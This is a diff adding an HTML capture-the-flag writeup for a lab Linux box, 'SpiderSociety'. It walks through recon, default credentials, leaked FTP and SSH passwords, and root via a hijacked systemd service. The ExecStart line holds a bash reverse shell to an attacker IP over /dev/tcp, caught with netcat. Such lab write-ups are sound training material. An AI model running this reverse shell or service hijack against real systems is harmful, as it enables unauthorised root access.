@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SpiderSociety &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge pg">PG</span>
+      <span class="badge os">Linux</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>SpiderSociety</h1>
+    <div class="meta">Target: <code>192.168.114.214</code></div>
+    <div class="tags"><span class="tag">Linux</span><span class="tag">DefaultCreds</span><span class="tag">FTP</span><span class="tag">CredentialHunting</span><span class="tag">Systemd</span><span class="tag">ServiceHijack</span><span class="tag">sudo</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#port-scan">Port Scan</a><a class="lvl3" href="#web-enumeration">Web Enumeration</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#ftp-source-code-disclosure">FTP Source Code Disclosure</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#writable-systemd-service-sudo-reload">Writable Systemd Service + sudo Reload</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>SpiderSociety is a Linux box where a weak admin credential opens a web portal, the portal leaks FTP credentials through an internal communications page, and the FTP server exposes PHP source code containing a path to a hidden credential file. Those credentials SSH straight in as <code>spidey</code>, who has write access to a systemd service file and sudo permission to reload and restart it, a clean service hijack to root.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="port-scan">Port Scan</h3>
+<pre><code class="language-sh">PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu
+80/tcp   open  http    Apache httpd 2.4.58 (Ubuntu)
+2121/tcp open  ftp     vsftpd 3.0.5
+</code></pre>
+<p>Three ports: SSH, HTTP on the standard port, and FTP on 2121 (non-standard).</p>
+<h3 id="web-enumeration">Web Enumeration</h3>
+<p>Gobuster against port 80:</p>
+<pre><code class="language-sh">/images     (Status: 301)
+/libspider  (Status: 301)
+</code></pre>
+<p><code>/libspider</code> is a login panel. Default credentials worked immediately:</p>
+<pre><code>admin:admin
+</code></pre>
+<blockquote>
+<p><strong>Default credentials before exploits.</strong> Any authenticated admin panel warrants a default-credential check before anything else. It costs one request.</p>
+</blockquote>
+<p>The portal has three sections. Communications is the key one, displaying plaintext credentials:</p>
+<pre><code>Username: ss_ftpbckuser
+Password: ss_WeLoveSpiderSociety_From_Tech_Dept5937!
+</code></pre>
+<h2 id="foothold">Foothold</h2>
+<h3 id="ftp-source-code-disclosure">FTP Source Code Disclosure</h3>
+<p>The FTP credentials connected to port 2121. Among the downloaded files was <strong>fetch-credentials.php</strong>, which contained a hardcoded path to a credential file:</p>
+<pre><code class="language-php">$credentialsFile = __DIR__ . '/.fuhfjkzbdsfuybefzmdbbzdcbhjzdbcukbdvbsdvuibdvnbdvenv';
+</code></pre>
+<p>The FTP client couldn't open the dotfile directly, but because the path sits alongside the <code>libspider</code> web files, fetching it over HTTP worked:</p>
+<pre><code>http://192.168.114.214/libspider/.fuhfjkzbdsfuybefzmdbbzdcbhjzdbcukbdvbsdvuibdvnbdvenv
+</code></pre>
+<p>Contents:</p>
+<pre><code>FTP_BACKUP_USER=ss_ftpbckuser
+FTP_BACKUP_PASS=ss_WeLoveSpiderSociety_From_Tech_Dept5937!
+
+DB_CONNECT_USER=spidey
+DB_CONNECT_PASS=WithGreatPowerComesGreatSecurity99!
+</code></pre>
+<blockquote>
+<p><strong>Why the obfuscated filename still exposed the secret:</strong> the file was hidden (dotfile prefix) and had a garbled name to defeat guessing, but it lived inside the web root. The FTP download of <code>fetch-credentials.php</code> revealed the exact path. Security through obscurity breaks the moment the obscuring layer (the PHP source) is readable. Once you have the path, HTTP serves it like any other static file.</p>
+</blockquote>
+<p>The DB credentials doubled as an SSH login:</p>
+<pre><code class="language-sh">ssh spidey@192.168.114.214
+spidey@spidersociety:~$ whoami
+spidey
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="writable-systemd-service-sudo-reload">Writable Systemd Service + sudo Reload</h3>
+<p>LinPEAS identified a writable service file:</p>
+<pre><code>You have write privileges over /etc/systemd/system/spiderbackup.service
+</code></pre>
+<p><code>sudo -l</code> confirmed the escalation path:</p>
+<pre><code class="language-sh">sudo /bin/systemctl daemon-reload
+sudo /bin/systemctl restart spiderbackup.service
+</code></pre>
+<p>I edited the service file to replace its <code>ExecStart</code> with a bash reverse shell:</p>
+<pre><code class="language-ini">[Service]
+Type=simple
+ExecStart=/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.45.172/443 0&gt;&amp;1'
+User=root
+Group=root
+</code></pre>
+<p>Then reloaded and restarted:</p>
+<pre><code class="language-sh">sudo /bin/systemctl daemon-reload
+sudo /bin/systemctl restart spiderbackup.service
+</code></pre>
+<p>Shell caught:</p>
+<pre><code class="language-sh">rlwrap nc -lvnp 443
+connect to [192.168.45.172] from (UNKNOWN) [192.168.114.214] 56084
+root@spidersociety:/# whoami
+root
+</code></pre>
+<blockquote>
+<p><strong>Why this works:</strong> systemd runs services as the user specified in the <code>User=</code> field. With <code>User=root</code> and the service definition under our control, systemd executes our <code>ExecStart</code> as root. The <code>daemon-reload</code> is necessary to pick up the modified unit file before restart, and both commands were in our sudo list without a password.</p>
+</blockquote>
+<h2 id="root">Root</h2>
+<pre><code class="language-sh">root@spidersociety:/# cat /root/proof.txt
+‹redacted›
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>Web portals protect themselves only as well as their default credentials.</strong> <code>admin:admin</code> opened everything here.</li>
+<li><strong>Source code fetched over FTP reveals file paths; those paths are still reachable over HTTP if the file lives in the web root.</strong> The obfuscated dotfile name was irrelevant once the PHP source gave away its exact path.</li>
+<li><strong>Write access to a systemd unit file plus sudo permission to restart it equals root</strong>, regardless of what the original service did.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
